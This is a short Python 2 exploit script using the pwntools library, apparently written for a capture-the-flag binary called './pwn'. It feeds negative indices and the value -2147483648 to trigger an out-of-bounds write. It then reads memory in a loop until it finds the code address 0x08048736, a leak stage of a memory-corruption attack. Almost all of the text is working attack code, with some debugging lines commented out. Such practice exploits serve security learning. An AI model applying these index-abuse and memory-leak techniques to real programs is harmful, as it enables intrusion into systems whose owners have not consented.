from pwn import *
import time,sys,binascii

elf_name = "./pwn"
elf = ELF(elf_name)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process(elf_name)
#gdb.attach(io, "b *0x0804863D")

io.recvuntil('enter index:\n')
#index = 0xffffffff
index = -1
#io.send(p32(index))
io.sendline(str(index))

io.recvuntil('enter value:\n')
data = -2147483648
#io.send(p32(data))
io.sendline(str(data))

io.recvuntil('enter index:\n')
index = -2
io.sendline(str(index))
io.recvuntil('enter value:\n')
data = 4
io.sendline(str(data))

for i in xrange(-2147483648,3):
    data = io.recvuntil('\t', drop = True)
    print '[' + str(hex(i)) +']' + data
    #data = (data)
    #print hex(i)
    data = int(data, 16)
    if data == 0x08048736:
        break
print hex(i)
